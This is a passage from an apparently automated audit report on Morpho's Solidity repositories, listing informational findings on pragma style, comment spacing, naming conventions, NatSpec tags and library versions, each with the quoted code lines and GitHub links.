91: interface IMetaMorpho is IMetaMorphoBase, IERC4626, IERC20Permit, IOwnable, IMulticall {

91: interface IMetaMorpho is IMetaMorphoBase, IERC4626, IERC20Permit, IOwnable, IMulticall {

91: interface IMetaMorpho is IMetaMorphoBase, IERC4626, IERC20Permit, IOwnable, IMulticall {

```

[80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L80), [91](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91), [91](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91), [91](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

42: interface IUniversalRewardsDistributorStaticTyping is IUniversalRewardsDistributorBase {

51: interface IUniversalRewardsDistributor is IUniversalRewardsDistributorBase {

```

[42](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L42), [51](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L51)




### Inconsistent method of specifying a floating pragma	_(duplicate of [Inconsistent and floating solidity pragma])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Some files use `>=`, while others use `^`. The instances below are examples of the method that has the fewestinstances for a specific version.

Occurrences of `^`: 27 and `>=`: 15`

*Instances (15)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L2)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L2)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L2)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L2)




### Inconsistent spacing in comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Some lines use // x and some use //x. The instances below point out the usages that don't follow the majority, within each file

*Instances (54)*:

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

5:     //bit 0-15: LTV

6:     //bit 16-31: Liq. threshold

7:     //bit 32-47: Liq. bonus

8:     //bit 48-55: Decimals

9:     //bit 56: Reserve is active

10:     //bit 57: reserve is frozen

11:     //bit 58: borrowing is enabled

12:     //bit 59: stable rate borrowing enabled

13:     //bit 60-63: reserved

14:     //bit 64-79: reserve factor

20:     //stores the reserve configuration

22:     //the liquidity index. Expressed in ray

24:     //variable borrow index. Expressed in ray

26:     //the current supply rate. Expressed in ray

28:     //the current variable borrow rate. Expressed in ray

30:     //the current stable borrow rate. Expressed in ray

33:     //tokens addresses

37:     //address of the interest rate strategy

39:     //the id of the reserve. Represents the position in the list of the active reserves

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L5), [6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L14), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L20), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L22), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L24), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L26), [28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L28), [30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L30), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L33), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L39)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

5:     //bit 0-15: LTV

6:     //bit 16-31: Liq. threshold

7:     //bit 32-47: Liq. bonus

8:     //bit 48-55: Decimals

9:     //bit 56: reserve is active

10:     //bit 57: reserve is frozen

11:     //bit 58: borrowing is enabled

12:     //bit 59: stable rate borrowing enabled

13:     //bit 60: asset is paused

14:     //bit 61: borrowing in isolation mode is enabled

15:     //bit 62: siloed borrowing enabled

16:     //bit 63: flashloaning enabled

17:     //bit 64-79: reserve factor

18:     //bit 80-115 borrow cap in whole tokens, borrowCap == 0 => no cap

19:     //bit 116-151 supply cap in whole tokens, supplyCap == 0 => no cap

20:     //bit 152-167 liquidation protocol fee

21:     //bit 168-175 eMode category

22:     //bit 176-211 unbacked mint cap in whole tokens, unbackedMintCap == 0 => minting disabled

23:     //bit 212-251 debt ceiling for isolation mode with (ReserveConfiguration::DEBT_CEILING_DECIMALS) decimals

24:     //bit 252-255 unused

29:     //stores the reserve configuration

31:     //the liquidity index. Expressed in ray

33:     //the current supply rate. Expressed in ray

35:     //variable borrow index. Expressed in ray

37:     //the current variable borrow rate. Expressed in ray

39:     //the current stable borrow rate. Expressed in ray

41:     //timestamp of last update

43:     //the id of the reserve. Represents the position in the list of the active reserves

45:     //aToken address

47:     //stableDebtToken address

49:     //variableDebtToken address

51:     //address of the interest rate strategy

53:     //the current treasury balance, scaled

55:     //the outstanding unbacked aTokens minted through the bridging feature

57:     //the outstanding debt borrowed against this asset in isolation mode

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L5), [6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L14), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L15), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L16), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L17), [18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L18), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L19), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L20), [21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L21), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L22), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L23), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L24), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L31), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L33), [35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L35), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L39), [41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L41), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L43), [45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L45), [47](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L47), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L49), [51](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L51), [53](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L53), [55](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L55), [57](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L57)




### Don't initialize `uint`s and `int`s with zero

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (4)*:

```solidity
File: morpho-blue/src/libraries/periphery/MorphoStorageLib.sol

14:     uint256 internal constant OWNER_SLOT = 0;

26:     uint256 internal constant LOAN_TOKEN_OFFSET = 0;

32:     uint256 internal constant SUPPLY_SHARES_OFFSET = 0;

35:     uint256 internal constant TOTAL_SUPPLY_ASSETS_AND_SHARES_OFFSET = 0;

```

[14](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoStorageLib.sol#L14), [26](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoStorageLib.sol#L26), [32](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoStorageLib.sol#L32), [35](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoStorageLib.sol#L35)



### Interfaces should be indicated with an `I` prefix in the contract name

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (1)*:

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

6: interface AggregatorV3Interface {

```

[6](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L6)



### Long functions should be refactored into multiple functions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider splitting long functions into multiple, smaller functions to improve the code readability.

*Instances (2)*:

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit number of line: 54
117:     function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {

```

[117](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L117)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit number of line: 55
56:     constructor(

```

[56](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L56)




### Consider moving `msg.sender` checks to a common authorization `modifier`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (3)*:

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

273:         require(msg.sender == address(MORPHO), ErrorsLib.UNAUTHORIZED_SENDER);

```

[273](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L273)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

101:         require(msg.sender == MORPHO, ErrorsLib.NOT_MORPHO);

```

[101](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L101)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

50:         require(msg.sender == owner, ErrorsLib.NOT_OWNER);

```

[50](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L50)




### Function names should differ to make the code more readable

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In Solidity, while function overriding allows for functions with the same name to coexist, it is advisable to avoid this practice to enhance code readability and maintainability. Having multiple functions with the same name, even with different parameters or in inherited contracts, can cause confusion and increase the likelihood of errors during development, testing, and debugging. Using distinct and descriptive function names not only clarifies the purpose and behavior of each function, but also helps prevent unintended function calls or incorrect overriding. By adopting a clear and consistent naming convention, developers can create more comprehensible and maintainable smart contracts.

*Instances (1)*:

```solidity
File: morpho-blue/src/Morpho.sol

/// @audit function name used on lines  501
513:     function _isHealthy(MarketParams memory marketParams, Id id, address borrower, uint256 collateralPrice)

```

[513](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L513)



### private and internal function names begin with an underscore

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

According to the Solidity Style Guide, Non-external variable and function names should begin0 with an[underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables)

*Instances (2)*:

```solidity
File: morpho-blue/src/libraries/SafeTransferLib.sol

21:     function safeTransfer(IERC20 token, address to, uint256 value) internal {

29:     function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {

```

[21](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L21), [29](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L29)



### Public and External function names should should use mixedCase

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

See the [function-names](https://docs.soliditylang.org/en/latest/style-guide.html#function-names) section of solidity style guide

*Instances (9)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

33:     function MORPHO() external view returns (IMorpho);

```

[33](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

5:     function DOMAIN_SEPARATOR() external view returns (bytes32);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);

```

[260](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

426:     function ADDRESSES_PROVIDER() external view returns (address);

470:     function MAX_STABLE_RATE_BORROW_SIZE_PERCENT() external view returns (uint256);

476:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);

482:     function BRIDGE_PROTOCOL_FEE() external view returns (uint256);

488:     function FLASHLOAN_PREMIUM_TO_PROTOCOL() external view returns (uint128);

494:     function MAX_NUMBER_RESERVES() external view returns (uint16);

```

[426](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L426), [470](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L470), [476](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L476), [482](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L482), [488](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L488), [494](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L494)




### Using underscore at the end of variable name

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The use of underscore at the end of the variable name is uncommon and also suggests that the variable name was not completely changed. Consider refactoring variableName_ to variableName.

*Instances (2)*:

```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

38:     constructor(string memory name_, string memory symbol_, IERC20 underlyingToken, address morpho, address bundler)

38:     constructor(string memory name_, string memory symbol_, IERC20 underlyingToken, address morpho, address bundler)

```

[38](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L38), [38](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L38)




### Update OpenZeppelin libraries to v5

**Severity:** Informational

**Context:** [.gitmodules#L7-L7](morpho-blue-bundlers/.gitmodules#L7-L7), [.gitmodules#L7-L7](universal-rewards-distributor/.gitmodules#L7-L7)

**Description**: The `bundlers` and `rewards` repos use OpenZeppelin libraries in version 4.9.3 for their submodules.

**Recommendation**: Consider updating to v5 which came with many fixes and efficiency improvements. The `metamorpho` and `oracles` repos already use v5.



### Contract declaration should include NatSpec `@notice` documentation	_(duplicate of [NatSpec: Contract declarations should have @author, @dev, @notice and @title tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (23)*:

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @notice
18: interface IMulticall {

/// @audit missed @notice
22: interface IOwnable {

/// @audit missed @notice
32: interface IMetaMorphoBase {

/// @audit missed @notice
80: interface IMetaMorphoStaticTyping is IMetaMorphoBase {

/// @audit missed @notice
91: interface IMetaMorpho is IMetaMorphoBase, IERC4626, IERC20Permit, IOwnable, IMulticall {

```

[18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L18), [22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L22), [32](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L32), [80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L80), [91](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @notice
6: interface IMorphoMarketParams {

```

[6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L6)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @notice
4: interface IDaiPermit {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L4)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

/// @audit missed @notice
4: library MainnetLib {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @notice
4: interface IStEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @notice
4: interface IWNative {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @notice
4: interface IWstEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @notice
43: interface IAaveV2 {

```

[43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

/// @audit missed @notice
61: interface IAaveV3 {

```

[61](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L61)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @notice
4: interface ICEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @notice
4: interface ICToken {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @notice
18: interface ICompoundV3 {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @notice
4: interface IComptroller {

```

